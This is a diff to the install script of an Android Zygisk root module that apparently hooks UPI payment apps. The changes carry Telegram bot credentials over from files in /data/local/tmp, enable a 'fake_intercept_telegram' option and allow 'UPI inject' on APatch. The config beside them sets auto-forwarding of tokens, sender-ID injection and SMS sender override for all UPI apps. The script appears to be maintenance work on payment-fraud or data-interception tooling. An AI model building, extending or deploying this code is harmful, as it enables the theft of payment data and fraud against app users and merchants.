@@ -3,15 +3,15 @@
 
 ui_print "*******************************"
 ui_print "   Virtus Zygisk Mode           "
-ui_print "     v1.0.19 INJECT FIX          "
+ui_print "     v1.0.20 INJECT+TG FIX       "
+ui_print "  Companion log · keep TG creds "
 ui_print "  Denylist → Unmount Only       "
 ui_print "  No early hooks · YesPay OK    "
-ui_print "  Deferred SMS · soft overlay   "
 ui_print "  @Hivirtus                     "
 ui_print "*******************************"
-ui_print "! Zygisk Next: Denylist Policy"
-ui_print "!   MUST be Unmount Only"
-ui_print "!   (Enforced = no UPI inject)"
+ui_print "! 1) ZygiskNext Denylist=Unmount Only"
+ui_print "! 2) Force-stop UPI app → reopen"
+ui_print "! 3) inject.log me safe_inject: dekho"
 
 if [ -z "$MODPATH" ]; then
   ui_print "! ERROR: MODPATH not set"
@@ -56,8 +56,21 @@ fi
 [ -f "$MODPATH/zygisk/arm64-v8a.so" ] && ui_print "- arm64-v8a.so OK"
 [ -f "$MODPATH/zygisk/armeabi-v7a.so" ] && ui_print "- armeabi-v7a.so OK (32-bit)"
 
-# Always refresh safe defaults (don't enable phone spoof / root hide)
-cat > "$MODPATH/config.json" << 'EOF'
+# Always refresh safe defaults — PRESERVE telegram tokens if already saved
+OLD_TG_TOKEN=""
+OLD_TG_CHAT=""
+for src in \
+  /data/local/tmp/hivirtus_telegram_credentials.json \
+  /data/local/tmp/hivirtus_ui_save.json \
+  /data/local/tmp/hivirtus_zygisk_mode_config.json \
+  "$MODPATH/config.json"
+do
+  [ -f "$src" ] || continue
+  [ -z "$OLD_TG_TOKEN" ] && OLD_TG_TOKEN=$(grep -o '"telegram_bot_token"[[:space:]]*:[[:space:]]*"[^"]*"' "$src" 2>/dev/null | head -n1 | sed 's/.*: *"\([^"]*\)".*/\1/')
+  [ -z "$OLD_TG_CHAT" ] && OLD_TG_CHAT=$(grep -o '"telegram_chat_id"[[:space:]]*:[[:space:]]*"[^"]*"' "$src" 2>/dev/null | head -n1 | sed 's/.*: *"\([^"]*\)".*/\1/')
+done
+
+cat > "$MODPATH/config.json" << EOF
 {
   "hide_root": false,
   "hide_developer": false,
@@ -72,26 +85,37 @@ cat > "$MODPATH/config.json" << 'EOF'
   "override_incoming_sender": false,
   "inject_sender_id": "",
   "auto_forward_token": true,
-  "telegram_bot_token": "",
-  "telegram_chat_id": "",
+  "fake_intercept_telegram": true,
+  "telegram_bot_token": "${OLD_TG_TOKEN}",
+  "telegram_chat_id": "${OLD_TG_CHAT}",
   "hook_all_upi_apps": true,
   "auto_hook_foreground": true,
   "log_file": "/data/local/tmp/virtus_zygisk_mode.log"
 }
 EOF
 set_perm "$MODPATH/config.json" 0 0 0644
-# Wipe runtime spoof that triggers bad paths
+# Wipe runtime spoof that triggers bad paths — NOT telegram creds
 rm -f /data/local/tmp/hivirtus_spoof_phone.txt 2>/dev/null
 rm -f /data/local/tmp/hivirtus_hooked_pkgs.txt 2>/dev/null
 cp -f "$MODPATH/config.json" /data/local/tmp/hivirtus_zygisk_mode_config.json 2>/dev/null
 chmod 644 /data/local/tmp/hivirtus_zygisk_mode_config.json 2>/dev/null
+if [ -n "$OLD_TG_TOKEN" ] && [ -n "$OLD_TG_CHAT" ]; then
+  printf '%s\n' "{\"telegram_bot_token\":\"${OLD_TG_TOKEN}\",\"telegram_chat_id\":\"${OLD_TG_CHAT}\"}" \
+    > /data/local/tmp/hivirtus_telegram_credentials.json
+  chmod 644 /data/local/tmp/hivirtus_telegram_credentials.json 2>/dev/null
+  ui_print "- Telegram creds preserved"
+else
+  ui_print "- Telegram empty — Save se token/chat id daalo"
+fi
+
+hivirtus_apatch_allow_upi_inject 2>/dev/null
 
 if [ -d /data/adb/ksu ] || [ -f /dev/kernelsu ]; then
   ui_print "- KernelSU detected"
 elif [ -f /data/adb/magisk.db ]; then
   ui_print "- Magisk detected"
 elif [ -d /data/adb/ap ] || [ -d /data/adb/apatch ]; then
-  ui_print "- APatch detected — phone/settings excluded"
+  ui_print "- APatch detected — phone/settings excluded, UPI inject allowed"
 fi
 
 echo "1" > /data/local/tmp/hivirtus_module_installed.flag
